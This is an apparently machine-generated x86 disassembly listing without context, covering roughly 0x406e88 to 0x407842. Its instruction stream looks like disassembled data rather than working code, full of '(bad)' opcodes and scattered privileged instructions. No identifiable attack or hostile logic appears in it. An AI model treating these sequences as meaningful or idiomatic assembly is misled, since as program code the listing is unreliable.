  406e88:	add    DWORD PTR ds:0x3301bf09,edi
  406e8e:	or     DWORD PTR [esi-0x36f6d1ff],esi
  406e94:	add    edx,ecx
  406e96:	or     al,cl
  406e98:	add    esp,esp
  406e9a:	or     bl,cl
  406e9c:	add    ebp,esp
  406e9e:	or     dl,cl
  406ea0:	add    edx,ebx
  406ea2:	or     ch,al
  406ea4:	add    DWORD PTR [eax],eax
	...
  406ebe:	loopne 0x406ec8
  406ec0:	mov    WORD PTR [ecx],es
  406ec2:	or     DWORD PTR [ecx],ecx
  406ec4:	xchg   DWORD PTR [ecx],eax
  406ec6:	adc    BYTE PTR [ecx],cl
  406ec8:	mov    es,WORD PTR [ecx]
  406eca:	pop    es
  406ecb:	or     DWORD PTR [ecx-0x6ff6eeff],eax
  406ed1:	add    esp,ebp
  406ed3:	or     BYTE PTR [ebx-0x7df712ff],dl
  406ed9:	add    esi,ebx
  406edb:	or     BYTE PTR [ebp+0x1],bh
  406ede:	fisttp WORD PTR [eax]
  406ee0:	push   esp
  406ee1:	add    DWORD PTR [eax],edx
  406ee3:	or     DWORD PTR [edi+0x1],ecx
  406ee6:	or     DWORD PTR [ecx],ecx
  406ee8:	inc    esi
  406ee9:	add    DWORD PTR [edx],eax
  406eeb:	or     DWORD PTR [ecx+0x1],ebx
  406eee:	sti    
  406eef:	or     BYTE PTR [eax],bh
  406ef1:	add    ebx,esp
  406ef3:	or     BYTE PTR [ebx],bh
  406ef5:	add    esp,edx
  406ef7:	or     BYTE PTR [edx],bh
  406ef9:	add    ebp,edx
  406efb:	or     BYTE PTR ds:0x1c08d601,dh
  406f01:	add    DWORD PTR [edi],edx
  406f03:	or     DWORD PTR [edi],edx
  406f05:	add    DWORD PTR [edx],eax
  406f07:	or     DWORD PTR [esi],ebx
  406f09:	add    DWORD PTR [esi],eax
  406f0b:	or     DWORD PTR [ecx],edx
  406f0d:	add    DWORD PTR [eax],ecx
  406f0f:	or     DWORD PTR [eax],eax
  406f11:	add    DWORD PTR [edi],ebx
  406f13:	or     DWORD PTR [ebx],eax
  406f15:	add    ebx,esp
  406f17:	or     BYTE PTR [eax],al
  406f19:	repnz hlt 
  406f1b:	sub    al,0x4
  406f1d:	in     eax,dx
  406f1e:	hlt    
  406f1f:	das    
  406f20:	add    al,0xe4
	...
  406f3a:	add    BYTE PTR [edx-0x5520fbd3],dh
  406f40:	sub    eax,DWORD PTR [esi+edx*8]
  406f43:	mov    ds:0x9b88042c,al
  406f48:	mov    BYTE PTR [ebx],al
  406f4a:	mov    edx,DWORD PTR [ebx-0x7475fc76]
  406f50:	lea    eax,[ebx]
  406f52:	lea    eax,[ebx+0x7b84038c]
  406f58:	lods   al,BYTE PTR ds:[esi]
  406f59:	add    ecx,DWORD PTR [esi+0x73]
  406f5c:	mov    es,WORD PTR [ebx]
  406f5e:	push   ecx
  406f5f:	imul   edx,DWORD PTR [eax-0x509cbffd],0x3
  406f66:	inc    edx
  406f67:	pop    ebx
  406f68:	xchg   ebx,eax
  406f69:	add    edx,DWORD PTR [edi+0x53]
  406f6c:	mov    DWORD PTR [ebx],eax
  406f6e:	dec    esi
  406f6f:	dec    ebx
  406f70:	stc    
  406f71:	pop    ds
  406f72:	cmp    BYTE PTR [ebx-0x52],al
  406f75:	add    edi,DWORD PTR [ebx]
  406f77:	cmp    esi,DWORD PTR [ecx-0x4fcc65fd]
  406f7d:	add    edx,DWORD PTR [ebp-0x63fc4cd5]
  406f83:	and    ecx,DWORD PTR [ebx+eax*1-0x69]
  406f87:	sbb    edx,DWORD PTR [edx+0x4e137e03]
  406f8d:	add    eax,DWORD PTR [ecx+0x7003510b]
  406f93:	add    ecx,DWORD PTR [edi+0x3]
  406f96:	jae    0x406f93
  406f98:	mov    cl,0x3
  406f9a:	(bad)
	...
  406fb7:	add    bl,ch
  406fb9:	je     0x406fbe
  406fbb:	sub    esp,ebx
  406fbd:	jae    0x406fc2
  406fbf:	sub    bl,bl
  406fc1:	jbe    0x406fc6
  406fc3:	add    BYTE PTR [ecx],ah
  406fc5:	bound  edx,QWORD PTR [ebx-0x6b9deffd]
  406fcb:	add    edx,DWORD PTR [ebx]
  406fcd:	bound  edx,QWORD PTR [ebp-0x699dedfd]
  406fd3:	add    esp,DWORD PTR [ebp+0x62]
  406fd6:	xchg   edi,eax
  406fd7:	add    esp,DWORD PTR [edx+eiz*2-0x68]
  406fdb:	add    edx,DWORD PTR [edi+0x62]
  406fde:	cdq    
  406fdf:	add    edx,DWORD PTR [esi+0x62]
  406fe2:	call   0x5803:0x9b624903
  406fe9:	bound  ebx,QWORD PTR [ebx+eax*1+0x39d625b]
  406ff0:	pop    edx
  406ff1:	bound  ebx,QWORD PTR [esi-0x609d52fd]
  406ff7:	add    ebp,DWORD PTR [edx+eiz*2+0x629f03a0]
  406ffe:	mov    ds:0xa362a103,al
  407003:	add    esi,DWORD PTR [eax+0x62]
  407006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407007:	add    esp,DWORD PTR [ebx+0x62]
  40700a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40700b:	add    esp,DWORD PTR [edx+0x62]
  40700e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40700f:	add    esp,DWORD PTR [ebp+0x62]
  407012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407013:	add    esi,DWORD PTR [edx+eiz*2+0x62bc03a8]
  40701a:	mov    al,0x3
	...
  407034:	add    BYTE PTR [edi-0x51fc4e9e],ch
  40703a:	bound  esi,QWORD PTR [edx-0x4c9d3efd]
  407040:	add    esi,DWORD PTR [eax-0x4cfc4b9e]
  407046:	bound  esi,QWORD PTR [ebp-0x499d4dfd]
  40704c:	add    eax,DWORD PTR ds:0x403b75f
  407052:	pop    edi
  407053:	mov    eax,0xfe03f403
  407058:	mov    ecx,0xbafe02f7
  40705d:	idiv   ecx
  40705f:	std    
  407060:	mov    ebx,0xbcfe10f7
  407065:	test   DWORD PTR [edi],0x5ef7bdfe
  40706b:	std    
  40706c:	mov    esi,0xbffd3df7
  407071:	idiv   DWORD PTR [edi*8-0x2c40840]
  407078:	ret    0x3af7
  40707b:	std    
  40707c:	shl    edi,0xa1
  40707f:	std    
  407080:	ret    
  407081:	neg    DWORD PTR [eax-0x60083b03]
  407087:	std    
  407088:	(bad)
  40708b:	std    
  40708c:	(bad)  
  40708d:	mul    DWORD PTR [ebp-0x5b083803]
  407093:	std    
  407094:	enter  0xccf7,0xfb
  407098:	mov    dh,0x0
	...
  4070b2:	pop    ss
  4070b3:	int3   
  4070b4:	sti    
  4070b5:	or     ebx,DWORD PTR [ecx]
  4070b7:	retf   
  4070b8:	sti    
  4070b9:	call   DWORD PTR [eax]
  4070bb:	retf   0x1ffb
  4070be:	pop    ss
  4070bf:	sar    ebx,1
  4070c1:	and    BYTE PTR [edi],dl
  4070c3:	enter  0x1fb,0xd9
  4070c7:	mov    ?,esp
  4070c9:	mov    al,ds:0xa2fc75d7
  4070ce:	xlat   BYTE PTR ds:[ebx]
  4070cf:	test   ah,bh
  4070d1:	mov    ds:0xa5fc83d7,eax
  4070d6:	xlat   BYTE PTR ds:[ebx]
  4070d7:	jb     0x4070d5
  4070d9:	call   0x88d7:0x9cfc91d7
  4070e0:	cld    
  4070e1:	popf   
  4070e2:	xlat   BYTE PTR ds:[ebx]
  4070e3:	(bad)  
  4070e5:	lahf   
  4070e6:	pop    ss
  4070e7:	add    eax,0x2393fc56
  4070ec:	pop    ecx
  4070ed:	cld    
  4070ee:	(bad)  
  4070ef:	and    edx,DWORD PTR [ebp-0x4]
  4070f2:	push   edi
  4070f3:	and    ecx,DWORD PTR [esp+edi*8+0x33]
  4070f7:	and    eax,DWORD PTR [edi-0x4]
  4070fa:	push   eax
  4070fb:	and    edi,DWORD PTR [esi]
  4070fd:	cld    
  4070fe:	push   cs
  4070ff:	and    ebp,DWORD PTR [ecx]
  407101:	cld    
  407102:	pop    es
  407103:	and    ebp,DWORD PTR [eax]
  407105:	cld    
  407106:	adc    BYTE PTR [ebx],ah
  407108:	stos   DWORD PTR es:[edi],eax
  407109:	sti    
  40710a:	or     DWORD PTR [ebx],esp
  40710c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40710d:	sti    
  40710e:	cli    
  40710f:	and    ah,BYTE PTR [ecx-0x5fdd2005]
  407115:	sti    
	...
  40712e:	add    BYTE PTR [esi],dh
  407130:	and    esi,DWORD PTR [ebx+edi*8-0x450da59]
  407137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407138:	and    eax,0x2314fba6
  40713d:	xchg   edi,eax
  40713e:	sti    
  40713f:	or     eax,0x75fbc323
  407144:	and    al,dl
  407146:	sti    
  407147:	jbe    0x40716b
  407149:	mov    ch,0xfb
  40714b:	or     al,0x23
  40714d:	lods   al,BYTE PTR ds:[esi]
  40714e:	sti    
  40714f:	sbb    eax,0x12fba723
  407154:	and    ebx,DWORD PTR [esi-0x79dce405]
  40715a:	sti    
  40715b:	cmc    
  40715c:	and    dh,BYTE PTR [edi-0x5]
  40715f:	test   DWORD PTR ds:0x257bfb62,eax
  407165:	pop    ebp
  407166:	sti    
  407167:	test   BYTE PTR ds:0x2585fb54,ah
  40716d:	dec    edi
  40716e:	sti    
  40716f:	and    ax,0xfa26
  407173:	aad    0x28
  407175:	dec    ecx
  407176:	cli    
  407177:	cmp    DWORD PTR [ecx],ebp
  407179:	add    BYTE PTR [eax-0x2],cl
  40717c:	je     0x4071a3
  40717e:	dec    ebx
  40717f:	out    dx,al
  407180:	or     eax,0xaee0a24
  407185:	and    al,0x5
  407187:	ficom  WORD PTR [ecx]
  407189:	and    al,0xc
  40718b:	fimul  WORD PTR [esp]
  40718e:	add    esi,ecx
  407190:	and    ah,BYTE PTR [eax+edx*1]
	...
  4071ab:	add    dh,cl
  4071ad:	or     esp,DWORD PTR [ebx+edx*1]
  4071b0:	mov    esi,0xbe0224f6
  4071b5:	push   cs
  4071b6:	and    eax,0x250aadfd
  4071bb:	aam    0xf9
  4071bd:	clc    
  4071be:	and    al,0xcf
  4071c0:	icebp  
  4071c1:	and    BYTE PTR ds:0x239ae9c6,ah
  4071c7:	fld    DWORD PTR [ecx]
  4071c9:	call   0xbb25:0x4f9b823
  4071d0:	icebp  
  4071d1:	mov    al,ds:0x9fe9ba23
  4071d6:	and    esi,DWORD PTR [ebp-0x63dafeff]
  4071dc:	stc    
  4071dd:	sub    BYTE PTR ds:0x2518f197,ah
  4071e3:	sahf   
  4071e4:	jmp    0x1d19719
  4071e9:	add    esp,DWORD PTR ds:0x2001fa48
  4071ef:	dec    ebx
  4071f0:	repnz add ah,BYTE PTR [eax]
  4071f3:	dec    edx
  4071f4:	jmp    0x2008:0x2452008
  4071fb:	mov    edx,?
  4071fd:	add    eax,0xcf28720
  407202:	and    BYTE PTR [esi-0x7edff416],cl
  407208:	add    cl,BYTE PTR [ebx]
  40720a:	and    BYTE PTR [eax],al
  40720c:	unpcklps xmm4,XMMWORD PTR fs:[eax]
	...
  407228:	add    BYTE PTR [edi+0xf],ah
  40722b:	adc    esp,DWORD PTR [eax]
  40722d:	jno    0x40723e
  40722f:	and    esp,DWORD PTR [ebx+esi*2]
  407232:	(bad)  
  407234:	and    BYTE PTR [edx+0xf],al
  407237:	and    eax,0x530f3d20
  40723c:	and    DWORD PTR [edi+ecx*1],edi
  40723f:	push   esp
  407240:	and    DWORD PTR [edi],ebp
  407242:	andnps xmm4,XMMWORD PTR [ecx]
  407245:	push   cs
  407246:	orps   xmm4,XMMWORD PTR [ecx]
  407249:	or     DWORD PTR [edi],ecx
  40724b:	push   edi
  40724c:	and    eax,edi
  40724e:	push   cs
  40724f:	pop    eax
  407250:	and    ebx,ebp
  407252:	push   cs
  407253:	pop    ecx
  407254:	and    DWORD PTR [edx+0x55215a0f],ecx
  40725a:	syscall 
  40725c:	and    DWORD PTR [esi-0x7edfedf1],eax
  407262:	movaps XMMWORD PTR [ebx],xmm4
  407265:	jo     0x407276
  407267:	add    BYTE PTR cs:[ebx],al
  40726a:	adc    BYTE PTR [edx],ch
  40726c:	and    ecx,DWORD PTR [esi+0xf]
  40726f:	pop    ebx
  407270:	and    DWORD PTR [ecx-0x67dea3f1],ebx
  407276:	minps  xmm4,XMMWORD PTR [ecx]
  407279:	fwait
  40727a:	divps  xmm4,XMMWORD PTR [ecx]
  40727d:	xchg   esp,eax
  40727e:	mov    cr4,ecx
  407281:	xchg   edi,eax
  407282:	movlps QWORD PTR [esi],xmm4
  407285:	or     DWORD PTR [edi],0xf9025c1
  40728b:	mov    bh,0x25
	...
  4072a5:	add    BYTE PTR [ebx-0x6dda34f1],dl
  4072ab:	imul   esp,DWORD PTR ds:0x20180fed
  4072b2:	fmul   QWORD PTR [edi]
  4072b4:	sbb    DWORD PTR [eax],esp
  4072b6:	hlt    
  4072b7:	sbb    DWORD PTR ds:0xd1ad41c,ecx
  4072bd:	sbb    eax,0x1e0cffd4
  4072c2:	aad    0xf5
  4072c4:	or     al,0x32
  4072c6:	aam    0xfe
  4072c8:	or     al,0x33
  4072ca:	adc    al,0xf5
  4072cc:	or     al,0x1d
  4072ce:	adc    eax,edi
  4072d0:	or     al,0xac
  4072d2:	sbb    DWORD PTR [edx],ebx
  4072d4:	or     eax,0xd1111c0
  4072d9:	mov    dh,0x19
  4072db:	sub    al,0xd
  4072dd:	iret   
  4072de:	adc    DWORD PTR [ebx],esp
  4072e0:	or     eax,0xd0e19ae
  4072e5:	out    0x11,al
  4072e7:	or     eax,0xfd9ab0d
  4072ec:	or     eax,0xe4ed1ad
  4072f1:	mov    bl,0xd9
  4072f3:	inc    ecx
  4072f4:	push   cs
  4072f5:	mov    ebp,0x60e48d1
  4072fa:	fiadd  DWORD PTR [ebx+0xe]
  4072fd:	and    dl,ah
  4072ff:	dec    edx
  407300:	push   cs
  407301:	stos   BYTE PTR es:[edi],al
  407302:	fnstenv ds:0x44d1b20e
  407308:	push   cs
  407309:	mov    esp,0x0
	...
  407322:	add    BYTE PTR [ecx],bl
  407324:	dec    eax
  407325:	push   cs
  407326:	sbb    al,0x12
  407328:	ja     0x407338
  40732a:	push   ds
  40732b:	sbb    cl,BYTE PTR [edx-0x7eed9cf2]
  407331:	push   cs
  407332:	data16 sbb bl,ah
  407335:	or     eax,0xdde1265
  40733a:	and    BYTE PTR [ebx],bl
  40733c:	fisttp QWORD PTR ds:0xde01420
  407342:	and    esp,edx
  407344:	fimul  WORD PTR ds:0x5d04d313
  40734a:	push   cs
  40734b:	or     esp,DWORD PTR [esp+edx*2]
  40734e:	push   cs
  40734f:	mov    esp,DWORD PTR [edx]
  407351:	pop    edi
  407352:	push   cs
  407353:	mov    eax,ds:0xb60e5622
  407358:	and    al,BYTE PTR [ecx+0xe]
  40735b:	mov    ah,0x22
  40735d:	inc    eax
  40735e:	push   cs
  40735f:	jmp    0x3228:0x90e3322
  407366:	push   cs
  407367:	add    esp,DWORD PTR [esi]
  407369:	and    eax,0x1c251c0e
  40736e:	push   cs
  40736f:	(bad)  
  407370:	and    al,0x17
  407372:	push   cs
  407373:	repnz and al,0x4a
  407376:	or     eax,0xd4f0508
  40737b:	add    al,BYTE PTR ds:0x270c0d51
  407381:	inc    eax
  407382:	or     eax,0xd2926db
	...
  40739f:	add    BYTE PTR [ebx+0x4],bl
  4073a2:	stos   DWORD PTR es:[edi],eax
  4073a3:	or     al,0x59
  4073a5:	es stos BYTE PTR es:[edi],al
  4073a7:	or     al,0xcd
  4073a9:	lods   eax,DWORD PTR es:[esi]
  4073ab:	or     al,0xfe
  4073ad:	daa    
  4073ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073af:	or     al,0x2b
  4073b1:	add    eax,0x26dc0cb3
  4073b6:	lods   eax,DWORD PTR ds:[esi]
  4073b7:	or     al,0x61
  4073b9:	daa    
  4073ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073bb:	or     al,0x98
  4073bd:	es sahf 
  4073bf:	or     al,0x3f
  4073c1:	and    DWORD PTR [edx-0x48d813f4],edi
  4073c7:	or     al,0xe
  4073c9:	daa    
  4073ca:	mov    cl,0xc
  4073cc:	ja     0x4073f4
  4073ce:	mov    bl,0xc
  4073d0:	jbe    0x4073f8
  4073d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073d3:	or     al,0x96
  4073d5:	es jge 0x4073e4
  4073d8:	xchg   edi,eax
  4073d9:	add    BYTE PTR es:[esi-0x76e00bfd],dl
  4073e0:	sti    
  4073e1:	xor    al,0x5
  4073e3:	dec    eax
  4073e4:	repz xor eax,0x36eb4b05
  4073ea:	add    eax,0x538034a
  4073ef:	inc    ebp
  4073f0:	sti    
  4073f1:	xor    BYTE PTR ds:0x531f34c,al
  4073f7:	inc    edi
  4073f8:	jmp    0x40742c
  4073fa:	add    eax,0x532034e
  4073ff:	inc    ecx
  407400:	sti    
  407401:	cmp    al,0x5
  407403:	adc    BYTE PTR [eax],al
	...
  40741d:	repz cmp eax,DWORD PTR ds:0x53eeb13
  407424:	add    al,BYTE PTR [ebx]
  407426:	ds add eax,0x538fafd
  40742c:	adc    al,0xf3
  40742e:	aaa    
  40742f:	add    eax,0x53aeb0f
  407434:	push   es
  407435:	add    edi,DWORD PTR [edx]
  407437:	add    eax,0x564faf9
  40743c:	fadd   DWORD PTR [esp+eiz*2]
  40743f:	add    eax,0x56704db
  407444:	(bad)  
  407446:	gs add eax,0x560e4d5
  40744c:	mov    esp,0xb7055fe4
  407451:	in     al,0x62
  407453:	add    eax,0x56204be
  407458:	mov    cl,0x4
  40745a:	ins    DWORD PTR es:[edi],dx
  40745b:	add    eax,0x56c04a0
  407460:	mov    ds:0x48056f04,eax
  407465:	in     eax,0x3
  407467:	push   cs
  407468:	dec    ebx
  407469:	in     eax,0x6
  40746b:	push   cs
  40746c:	add    BYTE PTR [esi-0x4ef1fd0d],ch
  407472:	repz add ecx,DWORD PTR [esi]
  407475:	shl    bl,0x4
  407478:	push   cs
  407479:	mov    bl,0xf3
  40747b:	add    eax,0x6f4720e
  407480:	push   cs
	...
  407499:	add    BYTE PTR [ebp+0x740e07f4],al
  40749f:	hlt    
  4074a0:	or     BYTE PTR [esi],cl
  4074a2:	ja     0x407498
  4074a4:	or     DWORD PTR [esi],ecx
  4074a6:	data16 hlt 
  4074a8:	or     cl,BYTE PTR [esi]
  4074aa:	imul   esi,esp,0xf3780e0b
  4074b0:	or     al,0xe
  4074b2:	imul   esi,esp,0xd
  4074b5:	push   cs
  4074b6:	dec    edx
  4074b7:	hlt    
  4074b8:	push   cs
  4074b9:	push   cs
  4074ba:	cmp    eax,0x2c0e0ff4
  4074bf:	hlt    
  4074c0:	adc    BYTE PTR [esi],cl
  4074c2:	das    
  4074c3:	hlt    
  4074c4:	adc    DWORD PTR [esi],ecx
  4074c6:	(bad)  
  4074c7:	repz adc cl,BYTE PTR [esi]
  4074ca:	add    esp,esi
  4074cc:	adc    ecx,DWORD PTR [esi]
  4074ce:	lock repz adc al,0xe
  4074d2:	jecxz  0x4074c7
  4074d4:	adc    eax,0x16f4820e
  4074d9:	push   cs
  4074da:	push   ebp
  4074db:	hlt    
  4074dc:	pop    ss
  4074dd:	push   cs
  4074de:	fs hlt 
  4074e0:	sbb    BYTE PTR [esi],cl
  4074e2:	addr16 hlt 
  4074e4:	sbb    DWORD PTR [esi],ecx
  4074e6:	jbe    0x4074dc
  4074e8:	sbb    cl,BYTE PTR [esi]
  4074ea:	stc    
  4074eb:	hlt    
  4074ec:	sbb    ecx,DWORD PTR [esi]
  4074ee:	call   0xdb4e91e7
  4074f3:	hlt    
  4074f4:	sbb    eax,0x1ef4da0e
  4074f9:	push   cs
  4074fa:	(bad)  
  4074fb:	hlt    
  4074fc:	pop    ds
  4074fd:	push   cs
	...
  407516:	add    ah,dh
  407518:	lods   al,BYTE PTR ds:[esi]
  407519:	adc    BYTE PTR [ecx],ah
  40751b:	cli    
  40751c:	lods   eax,DWORD PTR ds:[esi]
  40751d:	adc    BYTE PTR [edx],ah
  40751f:	repnz scas al,BYTE PTR es:[edi]
  407521:	adc    BYTE PTR [ebx],ah
  407523:	jmp    0x10a9:0x224109f
  40752a:	and    eax,0x2610a1fa
  40752f:	repnz sub dl,BYTE PTR [eax]
  407532:	daa    
  407533:	jmp    0x1025:0x2281013
  40753a:	sub    edx,edi
  40753c:	and    eax,0x16f22a10
  407541:	adc    BYTE PTR [ebx],ch
  407543:	jmp    0x1021:0x22c1027
  40754a:	sub    eax,0x2e0ff7fa
  40754f:	repnz push cs
  407551:	adc    BYTE PTR [edi],ch
  407553:	jmp    0x101d:0x230101d
  40755a:	xor    edx,edi
  40755c:	sbb    edx,DWORD PTR [eax]
  40755e:	xor    dh,dl
  407560:	cli    
  407561:	rdpmc  
  407563:	jmp    0xff9:0x2340ff1
  40756a:	xor    eax,0x360feffa
  40756f:	repnz xchg esi,eax
  407571:	getsec 
  407573:	jmp    0xf95:0x2380f45
  40757a:	cmp    DWORD PTR [eax],eax
	...
  407594:	cli    
  407595:	xchg   ebx,eax
  407596:	(bad)  
  407599:	lahf   
  40759a:	(bad)  
  40759c:	jmp    0xf4e:0x23f0f76
  4075a3:	inc    eax
  4075a4:	cli    
  4075a5:	dec    esp
  4075a6:	cmovno esi,edx
  4075a9:	add    al,0x8b
  4075ab:	movzx  eax,BYTE PTR [esi]
  4075ae:	mov    cl,BYTE PTR [edi]
  4075b0:	mov    bh,0x6
  4075b2:	lea    ecx,[edi]
  4075b4:	mov    al,0x6
  4075b6:	test   BYTE PTR [edi],cl
  4075b8:	mov    ecx,0xb20f8f06
  4075bd:	push   es
  4075be:	xchg   BYTE PTR [edi],cl
  4075c0:	mov    ebx,0xbc0f8106
  4075c5:	push   es
  4075c6:	or     BYTE PTR [edi],0xad
  4075c9:	push   es
  4075ca:	push   ebx
  4075cb:	fxsave [esi]
  4075ce:	push   edx
  4075cf:	movsx  eax,WORD PTR [esi]
  4075d2:	inc    ebp
  4075d3:	(bad)  
  4075d5:	push   es
  4075d6:	cmp    al,0xf
  4075d8:	mov    cl,0x6
  4075da:	cmp    DWORD PTR [edi],ecx
  4075dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075dd:	push   es
  4075de:	cmp    BYTE PTR [edi],cl
  4075e0:	inc    ebp
  4075e1:	pop    es
  4075e2:	cmp    ecx,DWORD PTR [edi]
  4075e4:	inc    esi
  4075e5:	pop    es
  4075e6:	cmp    cl,BYTE PTR [edi]
  4075e8:	inc    edi
  4075e9:	pop    es
  4075ea:	sbb    eax,0x1407400f
  4075ef:	movaps XMMWORD PTR [edi],xmm0
  4075f2:	pop    ds
  4075f3:	mov    cr0,edi
  4075f6:	push   ss
  4075f7:	sldt   WORD PTR [eax]
	...
  40760e:	add    BYTE PTR [eax],al
  407610:	add    BYTE PTR [ebx],ch
  407612:	pop    es
  407613:	add    DWORD PTR [edi],ecx
  407615:	sbb    al,0x7
  407617:	add    BYTE PTR [edi],cl
  407619:	dec    ebp
  40761a:	pop    es
  40761b:	dec    eax
  40761c:	push   cs
  40761d:	in     eax,0x15
  40761f:	dec    ebx
  407620:	push   cs
  407621:	out    0x15,al
  407623:	mov    cl,BYTE PTR ds:0xd8515e7
  407629:	enter  0x8c15,0xd
  40762d:	rcl    DWORD PTR ds:0x15ca0d87,0x8e
  407634:	or     eax,0xd9115c3
  407639:	sub    al,0x16
  40763b:	add    BYTE PTR [eax-0x7ccee207],al
  407641:	icebp  
  407642:	sbb    dh,BYTE PTR [ecx]
  407644:	push   edx
  407645:	jmp    0x18da765
  40764a:	sbb    DWORD PTR [ecx],esi
  40764c:	inc    esp
  40764d:	stc    
  40764e:	sbb    DWORD PTR [ecx],esi
  407650:	aas    
  407651:	icebp  
  407652:	push   ss
  407653:	xor    DWORD PTR [esi-0x17],edx
  407656:	pop    ss
  407657:	xor    DWORD PTR [ecx],edi
  407659:	add    ebp,eax
  40765b:	xor    BYTE PTR [eax],bh
  40765d:	stc    
  40765e:	lds    esi,FWORD PTR [eax]
  407660:	cmp    esi,ecx
  407662:	ret    0x9a30
  407665:	jmp    0x1d5a72d
  40766a:	shl    DWORD PTR [eax],0x9c
  40766d:	stc    
  40766e:	shl    DWORD PTR [eax],0x97
  407671:	icebp  
  407672:	mov    esi,0x7e30
	...
  40768b:	add    BYTE PTR [eax],al
  40768d:	add    cl,ch
  40768f:	mov    edi,0xcd018130
  407694:	xor    BYTE PTR [eax-0x7],dh
  407697:	retf   
  407698:	xor    BYTE PTR [ebx-0xf],dh
  40769b:	retf   0x6230
  40769e:	jmp    0x19da76c
  4076a3:	leave  
  4076a4:	xor    BYTE PTR [ecx+edi*8-0x39],dl
  4076a8:	xor    BYTE PTR [edi-0xf],cl
  4076ab:	(bad)  
  4076ac:	xor    BYTE PTR [esi-0x17],al
  4076af:	lds    esi,FWORD PTR [eax]
  4076b1:	sub    DWORD PTR [ecx],eax
  4076b3:	mov    ch,0x30
  4076b5:	sub    cl,bh
  4076b7:	mov    bl,0x30
  4076b9:	sub    esi,ecx
  4076bb:	mov    dl,0x30
  4076bd:	stos   BYTE PTR es:[edi],al
  4076be:	out    dx,al
  4076bf:	mov    cl,0x30
  4076c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c2:	(bad)  
  4076c3:	mov    al,0x30
  4076c5:	lods   al,BYTE PTR ds:[esi]
  4076c6:	(bad)  
  4076c7:	scas   eax,DWORD PTR es:[edi]
  4076c8:	xor    BYTE PTR [edi+0x30aeee],ah
  4076ce:	dec    edx
  4076cf:	or     edx,DWORD PTR [edi+0x31]
  4076d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d3:	or     ebx,DWORD PTR [eax+0x31]
  4076d6:	xchg   esp,eax
  4076d7:	or     ebx,DWORD PTR [ecx+0x31]
  4076da:	xchg   edi,eax
  4076db:	or     ebx,DWORD PTR [edx+0x31]
  4076de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076df:	or     ebx,DWORD PTR [ebx+0x31]
  4076e2:	mov    eax,ds:0x90315c0b
  4076e7:	or     ebx,DWORD PTR [ebp+0x31]
  4076ea:	arpl   WORD PTR [ebx],cx
  4076ec:	pop    esi
  4076ed:	xor    DWORD PTR [edx+0x315f0b],eax
	...
  40770b:	lea    ecx,[ebx]
  40770d:	pusha  
  40770e:	xor    DWORD PTR [ebx+ecx*1+0xb7f3161],ecx
  407715:	bound  esi,QWORD PTR [ecx]
  407717:	fimul  WORD PTR [edx]
  407719:	arpl   WORD PTR [ecx],si
  40771b:	leave  
  40771c:	or     ch,BYTE PTR [eax-0x56f537ef]
  407722:	adc    ebx,ecx
  407724:	or     ch,BYTE PTR [edx-0x54f525ef]
  40772a:	adc    DWORD PTR ds:0x411ac0b,edx
  407730:	or     ebp,DWORD PTR [ebp-0x51f4f8ef]
  407736:	adc    DWORD PTR [esi],esi
  407738:	or     ebp,DWORD PTR [edi-0x4ff4eeef]
  40773e:	adc    DWORD PTR [eax],eax
  407740:	or     esi,DWORD PTR [ecx-0x4df4ecef]
  407746:	adc    DWORD PTR [edx],edx
  407748:	or     esi,DWORD PTR [ebx-0x4bf502ef]
  40774e:	adc    esp,edi
  407750:	or     dh,BYTE PTR [ebp-0x49f510ef]
  407756:	adc    DWORD PTR [esi-0x46ee48f5],ebp
  40775c:	or     edi,DWORD PTR [eax+0x948f411]
  407762:	mov    ecx,0xba093de5
  407767:	in     eax,0x46
  407769:	or     DWORD PTR [ebx-0x43f6cbfb],edi
	...
  407787:	add    BYTE PTR ds:0x5bd0945,al
  40778d:	inc    edx
  40778e:	or     DWORD PTR [esi-0x40f68cfb],edi
  407794:	in     eax,0x87
  407796:	or     eax,eax
  407798:	in     eax,0x80
  40779a:	or     ecx,eax
  40779c:	in     eax,0xd5
  40779e:	or     dl,al
  4077a0:	in     eax,0x6e
  4077a2:	or     DWORD PTR [ebp-0x1b],ebp
  4077a5:	fisttp DWORD PTR [eax]
  4077a7:	jno    0x40778e
  4077a9:	fmul   QWORD PTR [eax]
  4077ab:	js     0x407792
  4077ad:	(bad)  [eax]
  4077af:	jg     0x407796
  4077b1:	mov    edx,0xafc58108
  4077b6:	or     BYTE PTR [ebp+eax*8-0x3a79f748],al
  4077bd:	lods   eax,DWORD PTR ds:[esi]
  4077be:	or     BYTE PTR [ebp-0x71f6e93b],cl
  4077c4:	and    eax,0x5eb08c6
  4077c9:	adc    eax,0x1805f009
  4077ce:	or     ecx,edi
  4077d0:	add    eax,0x14a9092b
  4077d5:	retf   0xabf5
  4077d8:	adc    al,0xba
  4077da:	cmc    
  4077db:	push   ecx
  4077dc:	cmc    
  4077dd:	shl    ch,0x52
  4077e0:	cmc    
  4077e1:	retf   
  4077e2:	cmc    
  4077e3:	ja     0x4077da
  4077e5:	mov    ebp,0xbcd4a022
  4077ea:	and    ah,BYTE PTR [ecx+0x0]
	...
  407804:	add    ah,dl
  407806:	mov    edi,0x4d4a222
  40780b:	mov    ah,BYTE PTR [edi+edx*2]
  40780e:	and    eax,0x25502485
  407813:	mov    WORD PTR [ecx+ebx*2],fs
  407816:	and    eax,0x25522487
  40781b:	mov    fs,WORD PTR [ebx+ebx*4]
  40781e:	and    eax,0x259c2491
  407823:	and    BYTE PTR [ecx*4-0x71db7cdb],0x25
  40782b:	push   edx
  40782c:	and    al,0x9f
  40782e:	and    eax,0x2598244d
  407833:	loope  0x40788d
  407835:	hlt    
  407836:	add    al,0xe1
  407838:	add    esi,esp
  40783a:	add    al,0xf0
  40783c:	pop    eax
  40783d:	hlt    
  40783e:	add    al,0xf0
  407840:	add    esi,esp
  407842:	add    al,0xe2
